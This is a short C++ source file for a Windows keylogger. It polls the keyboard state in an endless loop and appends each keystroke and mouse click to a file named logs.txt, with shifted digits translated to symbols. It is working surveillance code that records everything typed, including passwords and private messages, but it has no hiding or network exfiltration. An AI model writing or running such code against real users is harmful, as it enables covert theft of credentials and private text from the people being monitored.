// keyLogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <WinUser.h>
#include <map>

void logger(int key, char* file);

/*enum virtual_key_code
{
	41 = 48, 33, 64, 35, 36, 37, 94, 38, 42, 40
};
*/

int main(int argc, _TCHAR* argv[])
{
	// virtual_key_code keys;
	// virtual_key[] = { 41, 33, 64, 35, 36, 37, 94, 38, 42, 40 };

	std::map<int, int> keyCode{ { 48, 41 }, { 49, 33 }, { 50, 64 }, { 51, 35 }, { 52, 36 }, { 53, 37 }, { 54, 94 }, { 55, 38 }, { 56, 42 }, { 57, 40 } };

	char* file_name = "logs.txt";
	/* HHOOK SetWindowsHookExA(
		int       13,
		HOOKPROC  lpfn,
		HINSTANCE NULL,
		DWORD     0
		); */

	while (true){
		for (int key = 8; key < 200; key++){
			if (GetAsyncKeyState(key) == -32767){
				if ( key > 64 && key < 91 && !(GetAsyncKeyState(0x10)))
				{
					key = key + 32;
					logger(key, file_name);
				}
				else if (GetAsyncKeyState(0x10) && key > 47 && key < 58){
					key = keyCode.at(key);
					logger(key, file_name);
				}
				else
				{
					logger(key, file_name);
				}
			}
		}
	}
	return 0;
}

void logger(int key, char* filename){
	char key_pressed[30];
	std::ofstream myfile;
	myfile.open(filename, std::ios::app);
	switch (key)
	{
	case VK_LBUTTON:
		strcpy_s(key_pressed, "[LEFT_MOUSE]");
		std::cout << key;
		myfile << key_pressed;
		break;
	case VK_RBUTTON:
		strcpy_s(key_pressed, "[RIGHT_MOUSE]");
		std::cout << key;
		myfile << key_pressed;
		break;
	case VK_BACK:
		strcpy_s(key_pressed, "[BACKSPACE]");
		myfile << key_pressed;
		break;
	case VK_TAB:
		strcpy_s(key_pressed, "[TAB]");
		myfile << key_pressed;
		break;
	case VK_RETURN:
		strcpy_s(key_pressed, "[ENTER]");
		myfile << key_pressed;
		break;
	case VK_SPACE:
		strcpy_s(key_pressed, "[SPACE]");
		myfile << key_pressed;
		break;
	case VK_SHIFT:
		strcpy_s(key_pressed, "[SHIFT]");
		myfile << key_pressed;
		break;
	case VK_CONTROL:
		strcpy_s(key_pressed, "[CTRL]");
		myfile << key_pressed;
		break;
	//case VK_DECIMAL:
	case VK_OEM_PERIOD:
		strcpy_s(key_pressed, ".");
		myfile << key_pressed;
		break;
	default:
		myfile << char(key);
		std::cout << char(key);
		break;
	}
	myfile.close();
}